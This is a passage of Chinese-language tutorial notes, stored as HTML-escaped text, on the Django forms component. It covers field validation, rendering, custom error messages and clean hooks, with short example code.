&#x4F60;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x638C;&#x63E1;&#x5982;&#x4F55;&#x62F7;&#x8D1D;&#x4F7F;&#x7528; &#x4EE5;&#x53CA;&#x5927;&#x81F4;&#x7684;&#x63A8;&#x5BFC;&#x601D;&#x8DEF;&#x5373;&#x53EF;
&quot;&quot;&quot;
</code></pre>
<h4 id="forms&#x7EC4;&#x4EF6;-&#x524D;&#x620F;">Forms&#x7EC4;&#x4EF6;-&#x524D;&#x620F;</h4>
<pre><code class="lang-python">&quot;&quot;&quot;
&#x5199;&#x4E00;&#x4E2A;&#x6CE8;&#x518C;&#x529F;&#x80FD;
    &#x83B7;&#x53D6;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801; &#x5229;&#x7528;form&#x8868;&#x5355;&#x63D0;&#x4EA4;&#x6570;&#x636E;
    &#x5728;&#x540E;&#x7AEF;&#x5224;&#x65AD;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x662F;&#x5426;&#x7B26;&#x5408;&#x4E00;&#x5B9A;&#x7684;&#x6761;&#x4EF6;
        &#x7528;&#x6237;&#x540D;&#x4E2D;&#x4E0D;&#x80FD;&#x542B;&#x6709;&#x91D1;&#x74F6;&#x6885;
        &#x5BC6;&#x7801;&#x4E0D;&#x80FD;&#x5C11;&#x4E8E;&#x4E09;&#x4F4D;

    &#x5982;&#x4F55;&#x7B26;&#x5408;&#x6761;&#x4EF6;&#x9700;&#x8981;&#x4F60;&#x5C06;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#x5C55;&#x793A;&#x5230;&#x524D;&#x7AEF;&#x9875;&#x9762;
&quot;&quot;&quot;
def ab_form(request):
    back_dic = {&apos;username&apos;:&apos;&apos;,&apos;password&apos;:&apos;&apos;}
    if request.method == &apos;POST&apos;:
        username = request.POST.get(&apos;username&apos;)
        password = request.POST.get(&apos;password&apos;)
        if &apos;&#x91D1;&#x74F6;&#x6885;&apos; in username:
            back_dic[&apos;username&apos;] = &apos;&#x4E0D;&#x7B26;&#x5408;&#x793E;&#x4F1A;&#x4E3B;&#x4E49;&#x6838;&#x5FC3;&#x4EF7;&#x503C;&#x89C2;&apos;
        if len(password) &lt; 3:
            back_dic[&apos;password&apos;] = &apos;&#x4E0D;&#x80FD;&#x592A;&#x77ED; &#x4E0D;&#x597D;!&apos;
    &quot;&quot;&quot;
    &#x65E0;&#x8BBA;&#x662F;post&#x8BF7;&#x6C42;&#x8FD8;&#x662F;get&#x8BF7;&#x6C42;
    &#x9875;&#x9762;&#x90FD;&#x80FD;&#x591F;&#x83B7;&#x53D6;&#x5230;&#x5B57;&#x5178; &#x53EA;&#x4E0D;&#x8FC7;get&#x8BF7;&#x6C42;&#x6765;&#x7684;&#x65F6;&#x5019; &#x5B57;&#x5178;&#x503C;&#x90FD;&#x662F;&#x7A7A;&#x7684;
    &#x800C;post&#x8BF7;&#x6C42;&#x6765;&#x4E4B;&#x540E; &#x5B57;&#x5178;&#x53EF;&#x80FD;&#x6709;&#x503C;
    &quot;&quot;&quot;
    return render(request,&apos;ab_form.html&apos;,locals())

&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
    &lt;p&gt;username:
        &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;
        &lt;span style=&quot;color: red&quot;&gt;{[ back_dic.username ]}&lt;/span&gt;
    &lt;/p&gt;
    &lt;p&gt;password:
        &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;
        &lt;span style=&quot;color: red&quot;&gt;{[ back_dic.password ]}&lt;/span&gt;
    &lt;/p&gt;
    &lt;input type=&quot;submit&quot; class=&quot;btn btn-info&quot;&gt;
&lt;/form&gt;


&quot;&quot;&quot;
1.&#x624B;&#x52A8;&#x4E66;&#x5199;&#x524D;&#x7AEF;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x6570;&#x636E;&#x7684;html&#x4EE3;&#x7801;                        &#x6E32;&#x67D3;html&#x4EE3;&#x7801;
2.&#x540E;&#x7AEF;&#x5BF9;&#x7528;&#x6237;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x6821;&#x9A8C;                                             &#x6821;&#x9A8C;&#x6570;&#x636E;
3.&#x5BF9;&#x4E0D;&#x7B26;&#x5408;&#x8981;&#x6C42;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x524D;&#x7AEF;&#x63D0;&#x793A;                                &#x5C55;&#x793A;&#x63D0;&#x793A;&#x4FE1;&#x606F;

forms&#x7EC4;&#x4EF6;
    &#x80FD;&#x591F;&#x5B8C;&#x6210;&#x7684;&#x4E8B;&#x60C5;
            1.&#x6E32;&#x67D3;html&#x4EE3;&#x7801;
            2.&#x6821;&#x9A8C;&#x6570;&#x636E;
            3.&#x5C55;&#x793A;&#x63D0;&#x793A;&#x4FE1;&#x606F;

&#x4E3A;&#x4EC0;&#x4E48;&#x6570;&#x636E;&#x6821;&#x9A8C;&#x975E;&#x8981;&#x53BB;&#x540E;&#x7AEF; &#x4E0D;&#x80FD;&#x5728;&#x524D;&#x7AEF;&#x5229;&#x7528;js&#x76F4;&#x63A5;&#x5B8C;&#x6210;&#x5462;&#xFF1F;
    &#x6570;&#x636E;&#x6821;&#x9A8C;&#x524D;&#x7AEF;&#x53EF;&#x6709;&#x53EF;&#x65E0;
    &#x4F46;&#x662F;&#x540E;&#x7AEF;&#x5FC5;&#x987B;&#x8981;&#x6709;!!!

    &#x56E0;&#x4E3A;&#x524D;&#x7AEF;&#x7684;&#x6821;&#x9A8C;&#x662F;&#x5F31;&#x4E0D;&#x7981;&#x98CE;&#x7684; &#x4F60;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4FEE;&#x6539;
    &#x6216;&#x8005;&#x5229;&#x7528;&#x722C;&#x866B;&#x7A0B;&#x5E8F;&#x7ED5;&#x8FC7;&#x524D;&#x7AEF;&#x9875;&#x9762;&#x76F4;&#x63A5;&#x671D;&#x540E;&#x7AEF;&#x63D0;&#x4EA4;&#x6570;&#x636E;

    &#x8D2D;&#x7269;&#x7F51;&#x7AD9;    
        &#x9009;&#x53D6;&#x4E86;&#x8D27;&#x7269;&#x4E4B;&#x540E; &#x4F1A;&#x8BA1;&#x7B97;&#x4E00;&#x4E2A;&#x4EF7;&#x683C;&#x53D1;&#x9001;&#x7ED9;&#x540E;&#x7AEF; &#x5982;&#x679C;&#x540E;&#x7AEF;&#x4E0D;&#x505A;&#x4EF7;&#x683C;&#x7684;&#x6821;&#x9A8C;

        &#x5B9E;&#x9645;&#x662F;&#x83B7;&#x53D6;&#x5230;&#x7528;&#x6237;&#x9009;&#x62E9;&#x7684;&#x6240;&#x6709;&#x5546;&#x54C1;&#x7684;&#x4E3B;&#x952E;&#x503C;
        &#x7136;&#x540E;&#x5728;&#x540E;&#x7AEF;&#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x5546;&#x54C1;&#x7684;&#x4EF7;&#x683C; &#x518D;&#x6B21;&#x8BA1;&#x7B97;&#x4E00;&#x904D;
        &#x5982;&#x679C;&#x8DDF;&#x524D;&#x7AEF;&#x4E00;&#x81F4; &#x90A3;&#x4E48;&#x5B8C;&#x6210;&#x652F;&#x4ED8;&#x5982;&#x679C;&#x4E0D;&#x4E00;&#x81F4;&#x76F4;&#x63A5;&#x62D2;&#x7EDD;
&quot;&quot;&quot;
</code></pre>
<h4 id="&#x57FA;&#x672C;&#x4F7F;&#x7528;">&#x57FA;&#x672C;&#x4F7F;&#x7528;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> django <span class="hljs-keyword">import</span> forms


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyForm</span><span class="hljs-params">(forms.Form)</span>:</span>
    <span class="hljs-comment"># username&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x6700;&#x5C0F;3&#x4F4D;&#x6700;&#x5927;8&#x4F4D;</span>
    username = forms.CharField(min_length=<span class="hljs-number">3</span>,max_length=<span class="hljs-number">8</span>)
    <span class="hljs-comment"># password&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x6700;&#x5C0F;3&#x4F4D;&#x6700;&#x5927;8&#x4F4D;</span>
    password = forms.CharField(min_length=<span class="hljs-number">3</span>,max_length=<span class="hljs-number">8</span>)
    <span class="hljs-comment"># email&#x5B57;&#x6BB5;&#x5FC5;&#x987B;&#x7B26;&#x5408;&#x90AE;&#x7BB1;&#x683C;&#x5F0F;  xxx@xx.com</span>
    email = forms.EmailField()
</code></pre>
<h4 id="&#x6821;&#x9A8C;&#x6570;&#x636E;">&#x6821;&#x9A8C;&#x6570;&#x636E;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
1.&#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#x7684;&#x51C6;&#x5907; &#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x62F7;&#x8D1D;&#x4EE3;&#x7801;&#x51C6;&#x5907;
2.&#x5176;&#x5B9E;&#x5728;pycharm&#x91CC;&#x9762;&#x5DF2;&#x7ECF;&#x5E2E;&#x4F60;&#x51C6;&#x5907;&#x4E00;&#x4E2A;&#x6D4B;&#x8BD5;&#x73AF;&#x5883;
    python console
&quot;&quot;&quot;</span>
<span class="hljs-keyword">from</span> app01 <span class="hljs-keyword">import</span> views
<span class="hljs-comment"># 1 &#x5C06;&#x5E26;&#x6821;&#x9A8C;&#x7684;&#x6570;&#x636E;&#x7EC4;&#x7EC7;&#x6210;&#x5B57;&#x5178;&#x7684;&#x5F62;&#x5F0F;&#x4F20;&#x5165;&#x5373;&#x53EF;</span>
form_obj = views.MyForm({<span class="hljs-string">&apos;username&apos;</span>:<span class="hljs-string">&apos;jason&apos;</span>,<span class="hljs-string">&apos;password&apos;</span>:<span class="hljs-string">&apos;123&apos;</span>,<span class="hljs-string">&apos;email&apos;</span>:<span class="hljs-string">&apos;123&apos;</span>})
<span class="hljs-comment"># 2 &#x5224;&#x65AD;&#x6570;&#x636E;&#x662F;&#x5426;&#x5408;&#x6CD5;        &#x6CE8;&#x610F;&#x8BE5;&#x65B9;&#x6CD5;&#x53EA;&#x6709;&#x5728;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5168;&#x90E8;&#x5408;&#x6CD5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x624D;&#x4F1A;&#x8FD4;&#x56DE;True</span>
form_obj.is_valid()
<span class="hljs-keyword">False</span>
<span class="hljs-comment"># 3 &#x67E5;&#x770B;&#x6240;&#x6709;&#x6821;&#x9A8C;&#x901A;&#x8FC7;&#x7684;&#x6570;&#x636E;</span>
form_obj.cleaned_data
{<span class="hljs-string">&apos;username&apos;</span>: <span class="hljs-string">&apos;jason&apos;</span>, <span class="hljs-string">&apos;password&apos;</span>: <span class="hljs-string">&apos;123&apos;</span>}
<span class="hljs-comment"># 4 &#x67E5;&#x770B;&#x6240;&#x6709;&#x4E0D;&#x7B26;&#x5408;&#x6821;&#x9A8C;&#x89C4;&#x5219;&#x4EE5;&#x53CA;&#x4E0D;&#x7B26;&#x5408;&#x7684;&#x539F;&#x56E0;</span>
form_obj.errors
{
  <span class="hljs-string">&apos;email&apos;</span>: [<span class="hljs-string">&apos;Enter a valid email address.&apos;</span>]
}
<span class="hljs-comment"># 5 &#x6821;&#x9A8C;&#x6570;&#x636E;&#x53EA;&#x6821;&#x9A8C;&#x7C7B;&#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x5B57;&#x6BB5; &#x591A;&#x4F20;&#x4E0D;&#x5F71;&#x54CD; &#x591A;&#x4F20;&#x7684;&#x5B57;&#x6BB5;&#x76F4;&#x63A5;&#x5FFD;&#x7565;</span>
form_obj = views.MyForm({<span class="hljs-string">&apos;username&apos;</span>:<span class="hljs-string">&apos;jason&apos;</span>,<span class="hljs-string">&apos;password&apos;</span>:<span class="hljs-string">&apos;123&apos;</span>,<span class="hljs-string">&apos;email&apos;</span>:<span class="hljs-string">&apos;123@qq.com&apos;</span>,<span class="hljs-string">&apos;hobby&apos;</span>:<span class="hljs-string">&apos;study&apos;</span>})
form_obj.is_valid()
<span class="hljs-keyword">True</span>
<span class="hljs-comment"># 6 &#x6821;&#x9A8C;&#x6570;&#x636E; &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B; &#x7C7B;&#x91CC;&#x9762;&#x6240;&#x6709;&#x7684;&#x5B57;&#x6BB5;&#x90FD;&#x5FC5;&#x987B;&#x4F20;&#x503C;</span>
form_obj = views.MyForm({<span class="hljs-string">&apos;username&apos;</span>:<span class="hljs-string">&apos;jason&apos;</span>,<span class="hljs-string">&apos;password&apos;</span>:<span class="hljs-string">&apos;123&apos;</span>})
form_obj.is_valid()
<span class="hljs-keyword">False</span>
<span class="hljs-string">&quot;&quot;&quot;
&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x6821;&#x9A8C;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019; &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x591A;&#x4F20;&#x4F46;&#x662F;&#x7EDD;&#x4E0D;&#x53EF;&#x80FD;&#x5C11;&#x4F20;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x6E32;&#x67D3;&#x6807;&#x7B7E;">&#x6E32;&#x67D3;&#x6807;&#x7B7E;</h4>
<pre><code class="lang-python">&quot;&quot;&quot;
forms&#x7EC4;&#x4EF6;&#x53EA;&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x6E32;&#x67D3;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x6807;&#x7B7E;(input select radio checkbox)
&#x4E0D;&#x80FD;&#x5E2E;&#x4F60;&#x6E32;&#x67D3;&#x63D0;&#x4EA4;&#x6309;&#x94AE;
&quot;&quot;&quot;
def index(request):
    # 1 &#x5148;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x7A7A;&#x5BF9;&#x8C61;
    form_obj = MyForm()
    # 2 &#x76F4;&#x63A5;&#x5C06;&#x8BE5;&#x7A7A;&#x5BF9;&#x8C61;&#x4F20;&#x9012;&#x7ED9;html&#x9875;&#x9762;
    return render(request,&apos;index.html&apos;,locals())

# &#x524D;&#x7AEF;&#x5229;&#x7528;&#x7A7A;&#x5BF9;&#x8C61;&#x505A;&#x64CD;&#x4F5C;
    &lt;p&gt;&#x7B2C;&#x4E00;&#x79CD;&#x6E32;&#x67D3;&#x65B9;&#x5F0F;:&#x4EE3;&#x7801;&#x4E66;&#x5199;&#x6781;&#x5C11;&#xFF0C;&#x5C01;&#x88C5;&#x7A0B;&#x5EA6;&#x592A;&#x9AD8; &#x4E0D;&#x4FBF;&#x4E8E;&#x540E;&#x7EED;&#x7684;&#x6269;&#x5C55; &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x53EA;&#x5728;&#x672C;&#x5730;&#x6D4B;&#x8BD5;&#x4F7F;&#x7528;&lt;/p&gt;
    {[ form_obj.as_p ]}
    {[ form_obj.as_ul ]}
    {[ form_obj.as_table ]}
    &lt;p&gt;&#x7B2C;&#x4E8C;&#x79CD;&#x6E32;&#x67D3;&#x65B9;&#x5F0F;:&#x53EF;&#x6269;&#x5C55;&#x6027;&#x5F88;&#x5F3A; &#x4F46;&#x662F;&#x9700;&#x8981;&#x4E66;&#x5199;&#x7684;&#x4EE3;&#x7801;&#x592A;&#x591A;  &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x7528;&lt;/p&gt;
    &lt;p&gt;{[ form_obj.username.label ]}:{[ form_obj.username ]}&lt;/p&gt;
    &lt;p&gt;{[ form_obj.password.label ]}:{[ form_obj.password ]}&lt;/p&gt;
    &lt;p&gt;{[ form_obj.email.label ]}:{[ form_obj.email ]}&lt;/p&gt;
    &lt;p&gt;&#x7B2C;&#x4E09;&#x79CD;&#x6E32;&#x67D3;&#x65B9;&#x5F0F;(&#x63A8;&#x8350;&#x4F7F;&#x7528;):&#x4EE3;&#x7801;&#x4E66;&#x5199;&#x7B80;&#x5355; &#x5E76;&#x4E14;&#x6269;&#x5C55;&#x6027;&#x4E5F;&#x9AD8;&lt;/p&gt;
    {# for form in form_obj #}
        &lt;p&gt;{[ form.label ]}:{[ form ]}&lt;/p&gt;
    {# endfor #}

&quot;&quot;&quot;
label&#x5C5E;&#x6027;&#x9ED8;&#x8BA4;&#x5C55;&#x793A;&#x7684;&#x662F;&#x7C7B;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x5B57;&#x6BB5;&#x9996;&#x5B57;&#x6BCD;&#x5927;&#x5199;&#x7684;&#x5F62;&#x5F0F;
&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x4FEE;&#x6539; &#x76F4;&#x63A5;&#x7ED9;&#x5B57;&#x6BB5;&#x5BF9;&#x8C61;&#x52A0;label&#x5C5E;&#x6027;&#x5373;&#x53EF;
     username = forms.CharField(min_length=3,max_length=8,label=&apos;&#x7528;&#x6237;&#x540D;&apos;)
&quot;&quot;&quot;
</code></pre>
<h4 id="&#x5C55;&#x793A;&#x63D0;&#x793A;&#x4FE1;&#x606F;">&#x5C55;&#x793A;&#x63D0;&#x793A;&#x4FE1;&#x606F;</h4>
<pre><code class="lang-python">&quot;&quot;&quot;
&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x6821;&#x9A8C;&#x6570;&#x636E; &#x4F46;&#x662F;&#x524D;&#x7AEF;&#x7684;&#x6821;&#x9A8C;&#x5F31;&#x4E0D;&#x7981;&#x98CE;
&#x5982;&#x4F55;&#x8BA9;&#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x505A;&#x6821;&#x9A8C;
    &lt;form action=&quot;&quot; method=&quot;post&quot; novalidate&gt;
&quot;&quot;&quot;
def index(request):
    # 1 &#x5148;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x7A7A;&#x5BF9;&#x8C61;
    form_obj = MyForm()
    if request.method == &apos;POST&apos;:
        # &#x83B7;&#x53D6;&#x7528;&#x6237;&#x6570;&#x636E;&#x5E76;&#x4E14;&#x6821;&#x9A8C;
        &quot;&quot;&quot;
        1.&#x6570;&#x636E;&#x83B7;&#x53D6;&#x7E41;&#x7410;
        2.&#x6821;&#x9A8C;&#x6570;&#x636E;&#x9700;&#x8981;&#x6784;&#x9020;&#x6210;&#x5B57;&#x5178;&#x7684;&#x683C;&#x5F0F;&#x4F20;&#x5165;&#x624D;&#x884C;
        ps:&#x4F46;&#x662F;request.POST&#x53EF;&#x4EE5;&#x770B;&#x6210;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x5178;
        &quot;&quot;&quot;
        # 3.&#x6821;&#x9A8C;&#x6570;&#x636E;
        form_obj = MyForm(request.POST)
        # 4.&#x5224;&#x65AD;&#x6570;&#x636E;&#x662F;&#x5426;&#x5408;&#x6CD5;
        if form_obj.is_valid():
            # 5.&#x5982;&#x679C;&#x5408;&#x6CD5; &#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x5B58;&#x50A8;&#x6570;&#x636E;
            return HttpResponse(&apos;OK&apos;)
        # 5.&#x4E0D;&#x5408;&#x6CD5; &#x6709;&#x9519;&#x8BEF;
    # 2 &#x76F4;&#x63A5;&#x5C06;&#x8BE5;&#x7A7A;&#x5BF9;&#x8C61;&#x4F20;&#x9012;&#x7ED9;html&#x9875;&#x9762;
    return render(request,&apos;index.html&apos;,locals())

{# for form in form_obj #}
        &lt;p&gt;
            {[ form.label ]}:{[ form ]}
            &lt;span style=&quot;color: red&quot;&gt;{[ form.errors.0 ]}&lt;/span&gt;
        &lt;/p&gt;
{# endfor #}

&quot;&quot;&quot;
1.&#x5FC5;&#x5907;&#x7684;&#x6761;&#x4EF6; get&#x8BF7;&#x6C42;&#x548C;post&#x4F20;&#x7ED9;html&#x9875;&#x9762;&#x5BF9;&#x8C61;&#x53D8;&#x91CF;&#x540D;&#x5FC5;&#x987B;&#x4E00;&#x6837;
2.forms&#x7EC4;&#x4EF6;&#x5F53;&#x4F60;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x5408;&#x6CD5;&#x7684;&#x60C5;&#x51B5;&#x4E0B; &#x4F1A;&#x4FDD;&#x5B58;&#x4F60;&#x4E0A;&#x6B21;&#x7684;&#x6570;&#x636E; &#x8BA9;&#x4F60;&#x57FA;&#x4E8E;&#x4E4B;&#x524D;&#x7684;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x4FEE;&#x6539;
&#x66F4;&#x52A0;&#x7684;&#x4EBA;&#x6027;&#x5316;
&quot;&quot;&quot;
# &#x9488;&#x5BF9;&#x9519;&#x8BEF;&#x7684;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#x8FD8;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x81EA;&#x5B9A;&#x5236;
class MyForm(forms.Form):
    # username&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x6700;&#x5C0F;3&#x4F4D;&#x6700;&#x5927;8&#x4F4D;
    username = forms.CharField(min_length=3,max_length=8,label=&apos;&#x7528;&#x6237;&#x540D;&apos;,
                               error_messages={
                                   &apos;min_length&apos;:&apos;&#x7528;&#x6237;&#x540D;&#x6700;&#x5C11;3&#x4F4D;&apos;,
                                   &apos;max_length&apos;:&apos;&#x7528;&#x6237;&#x540D;&#x6700;&#x5927;8&#x4F4D;&apos;,
                                   &apos;required&apos;:&quot;&#x7528;&#x6237;&#x540D;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&quot;
                               }
                               )
    # password&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x6700;&#x5C0F;3&#x4F4D;&#x6700;&#x5927;8&#x4F4D;
    password = forms.CharField(min_length=3,max_length=8,label=&apos;&#x5BC6;&#x7801;&apos;,
                               error_messages={
                                   &apos;min_length&apos;: &apos;&#x5BC6;&#x7801;&#x6700;&#x5C11;3&#x4F4D;&apos;,
                                   &apos;max_length&apos;: &apos;&#x5BC6;&#x7801;&#x6700;&#x5927;8&#x4F4D;&apos;,
                                   &apos;required&apos;: &quot;&#x5BC6;&#x7801;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&quot;
                               }
                               )
    # email&#x5B57;&#x6BB5;&#x5FC5;&#x987B;&#x7B26;&#x5408;&#x90AE;&#x7BB1;&#x683C;&#x5F0F;  xxx@xx.com
    email = forms.EmailField(label=&apos;&#x90AE;&#x7BB1;&apos;,
                             error_messages={
                                 &apos;invalid&apos;:&apos;&#x90AE;&#x7BB1;&#x683C;&#x5F0F;&#x4E0D;&#x6B63;&#x786E;&apos;,
                                 &apos;required&apos;: &quot;&#x90AE;&#x7BB1;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&quot;
                             }
                             )
</code></pre>
<h4 id="&#x94A9;&#x5B50;&#x51FD;&#x6570;hook">&#x94A9;&#x5B50;&#x51FD;&#x6570;(HOOK)</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x5728;&#x7279;&#x5B9A;&#x7684;&#x8282;&#x70B9;&#x81EA;&#x52A8;&#x89E6;&#x53D1;&#x5B8C;&#x6210;&#x54CD;&#x5E94;&#x64CD;&#x4F5C;

&#x94A9;&#x5B50;&#x51FD;&#x6570;&#x5728;forms&#x7EC4;&#x4EF6;&#x4E2D;&#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;&#x7B2C;&#x4E8C;&#x9053;&#x5173;&#x5361;&#xFF0C;&#x80FD;&#x591F;&#x8BA9;&#x6211;&#x4EEC;&#x81EA;&#x5B9A;&#x4E49;&#x6821;&#x9A8C;&#x89C4;&#x5219;

&#x5728;forms&#x7EC4;&#x4EF6;&#x4E2D;&#x6709;&#x4E24;&#x7C7B;&#x94A9;&#x5B50;
    1.&#x5C40;&#x90E8;&#x94A9;&#x5B50;
        &#x5F53;&#x4F60;&#x9700;&#x8981;&#x7ED9;&#x5355;&#x4E2A;&#x5B57;&#x6BB5;&#x589E;&#x52A0;&#x6821;&#x9A8C;&#x89C4;&#x5219;&#x7684;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;
    2.&#x5168;&#x5C40;&#x94A9;&#x5B50;
      &#x5F53;&#x4F60;&#x9700;&#x8981;&#x7ED9;&#x591A;&#x4E2A;&#x5B57;&#x6BB5;&#x589E;&#x52A0;&#x6821;&#x9A8C;&#x89C4;&#x5219;&#x7684;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x5B9E;&#x9645;&#x6848;&#x4F8B;</span>

<span class="hljs-comment"># 1.&#x6821;&#x9A8C;&#x7528;&#x6237;&#x540D;&#x4E2D;&#x4E0D;&#x80FD;&#x542B;&#x6709;666                &#x53EA;&#x662F;&#x6821;&#x9A8C;username&#x5B57;&#x6BB5;  &#x5C40;&#x90E8;&#x94A9;&#x5B50;</span>

<span class="hljs-comment"># 2.&#x6821;&#x9A8C;&#x5BC6;&#x7801;&#x548C;&#x786E;&#x8BA4;&#x5BC6;&#x7801;&#x662F;&#x5426;&#x4E00;&#x81F4;            password confirm&#x4E24;&#x4E2A;&#x5B57;&#x6BB5;    &#x5168;&#x5C40;&#x94A9;&#x5B50;</span>

<span class="hljs-comment"># &#x94A9;&#x5B50;&#x51FD;&#x6570;  &#x5728;&#x7C7B;&#x91CC;&#x9762;&#x4E66;&#x5199;&#x65B9;&#x6CD5;&#x5373;&#x53EF;</span>
    <span class="hljs-comment"># &#x5C40;&#x90E8;&#x94A9;&#x5B50;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clean_username</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-comment"># &#x83B7;&#x53D6;&#x5230;&#x7528;&#x6237;&#x540D;</span>
        username = self.cleaned_data.get(<span class="hljs-string">&apos;username&apos;</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;666&apos;</span> <span class="hljs-keyword">in</span> username:
            <span class="hljs-comment"># &#x63D0;&#x793A;&#x524D;&#x7AEF;&#x5C55;&#x793A;&#x9519;&#x8BEF;&#x4FE1;&#x606F;</span>
            self.add_error(<span class="hljs-string">&apos;username&apos;</span>,<span class="hljs-string">&apos;&#x5149;&#x558A;666&#x662F;&#x4E0D;&#x884C;&#x6EF4;&#xFF5E;&apos;</span>)
        <span class="hljs-comment"># &#x5C06;&#x94A9;&#x5B50;&#x51FD;&#x6570;&#x94A9;&#x53BB;&#x51FA;&#x6765;&#x6570;&#x636E;&#x518D;&#x653E;&#x56DE;&#x53BB;</span>
        <span class="hljs-keyword">return</span> username

    <span class="hljs-comment"># &#x5168;&#x5C40;&#x94A9;&#x5B50;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clean</span><span class="hljs-params">(self)</span>:</span>
        password = self.cleaned_data.get(<span class="hljs-string">&apos;password&apos;</span>)
        confirm_password = self.cleaned_data.get(<span class="hljs-string">&apos;confirm_password&apos;</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> confirm_password == password:
            self.add_error(<span class="hljs-string">&apos;confirm_password&apos;</span>,<span class="hljs-string">&apos;&#x4E24;&#x6B21;&#x5BC6;&#x7801;&#x4E0D;&#x4E00;&#x81F4;&apos;</span>)
        <span class="hljs-comment"># &#x5C06;&#x94A9;&#x5B50;&#x51FD;&#x6570;&#x94A9;&#x51FA;&#x6765;&#x6570;&#x636E;&#x518D;&#x653E;&#x56DE;&#x53BB;</span>
        <span class="hljs-keyword">return</span> self.cleaned_data
</code></pre>
<h4 id="forms&#x7EC4;&#x4EF6;&#x5176;&#x4ED6;&#x53C2;&#x6570;&#x53CA;&#x8865;&#x5145;&#x77E5;&#x8BC6;&#x70B9;">forms&#x7EC4;&#x4EF6;&#x5176;&#x4ED6;&#x53C2;&#x6570;&#x53CA;&#x8865;&#x5145;&#x77E5;&#x8BC6;&#x70B9;</h4>
<pre><code class="lang-python">label        &#x5B57;&#x6BB5;&#x540D;
error_messages  &#x81EA;&#x5B9A;&#x4E49;&#x62A5;&#x9519;&#x4FE1;&#x606F;
initial  &#x9ED8;&#x8BA4;&#x503C;
required  &#x63A7;&#x5236;&#x5B57;&#x6BB5;&#x662F;&#x5426;&#x5FC5;&#x586B;
<span class="hljs-string">&quot;&quot;&quot;
1.&#x5B57;&#x6BB5;&#x6CA1;&#x6709;&#x6837;&#x5F0F;
2.&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7C7B;&#x578B;&#x7684;input&#x5982;&#x4F55;&#x4FEE;&#x6539;
    text
    password
    date
    radio
    checkbox
    ...
&quot;&quot;&quot;</span>
widget=forms.widgets.PasswordInput(attrs={<span class="hljs-string">&apos;class&apos;</span>:<span class="hljs-string">&apos;form-control c1 c2&apos;</span>})
<span class="hljs-comment"># &#x591A;&#x4E2A;&#x5C5E;&#x6027;&#x503C;&#x7684;&#x8BDD; &#x76F4;&#x63A5;&#x7A7A;&#x683C;&#x9694;&#x5F00;&#x5373;&#x53EF;</span>

<span class="hljs-comment"># &#x7B2C;&#x4E00;&#x9053;&#x5173;&#x5361;&#x91CC;&#x9762;&#x8FD8;&#x652F;&#x6301;&#x6B63;&#x5219;&#x6821;&#x9A8C;</span>
validators=[
